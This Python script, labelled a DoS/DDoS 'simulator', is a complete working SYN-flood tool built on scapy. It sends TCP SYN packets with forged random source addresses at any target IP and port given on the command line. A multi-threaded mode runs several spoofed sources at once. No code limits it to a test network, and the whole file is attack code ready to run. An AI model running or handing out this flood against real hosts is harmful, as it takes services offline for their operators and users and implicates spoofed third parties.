#!/usr/bin/env python3
"""
dos_ddos_simulator.py

Simulate DoS and DDoS attacks by sending forged TCP SYN floods.

Usage (Windows Admin):
  python dos_ddos_simulator.py --target 192.168.29.112 --mode ddos --rate 100 --threads 4
"""
import argparse
import random
import threading
import time
from scapy.all import IP, TCP, send

def random_ip() -> str:
    """Generate a random non-reserved IPv4 address."""
    return "{}.{}.{}.{}".format(
        random.randint(1, 223),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )

def syn_flood(src_ip: str, dst_ip: str, dst_port: int, rate: int):
    """
    Continuously send TCP SYN packets from src_ip → dst_ip:dst_port.
    Includes a debug print so you can see it firing.
    """
    pkt = IP(src=src_ip, dst=dst_ip) / TCP(dport=dst_port, flags="S")
    delay = 1.0 / rate
    while True:
        print(f"→ SYN from {src_ip} to {dst_ip}:{dst_port}")
        send(pkt, verbose=False)
        time.sleep(delay)

def run_dos(target: str, port: int, rate: int):
    """Single‐source SYN flood."""
    src = random_ip()
    print(f"[+] Starting DoS from {src} → {target}:{port} at {rate} pps")
    syn_flood(src, target, port, rate)

def run_ddos(target: str, port: int, rate: int, threads: int):
    """Multi‐source SYN flood with multiple threads."""
    print(f"[+] Starting DDoS on {target}:{port} with {threads} threads × {rate} pps each")
    for _ in range(threads):
        src = random_ip()
        t = threading.Thread(
            target=syn_flood,
            args=(src, target, port, rate),
            daemon=True
        )
        t.start()
        time.sleep(0.1)  # stagger thread startups
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Simulation stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS/DDoS SYN flood simulator")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument(
        "--mode", choices=("dos", "ddos"), default="dos",
        help="Attack mode: dos or ddos"
    )
    parser.add_argument(
        "--rate", type=int, default=100,
        help="Packets per second per thread (default: 100)"
    )
    parser.add_argument(
        "--threads", type=int, default=5,
        help="Number of threads for ddos (default: 5)"
    )
    args = parser.parse_args()

    if args.mode == "dos":
        run_dos(args.target, args.port, args.rate)
    else:
        run_ddos(args.target, args.port, args.rate, args.threads)
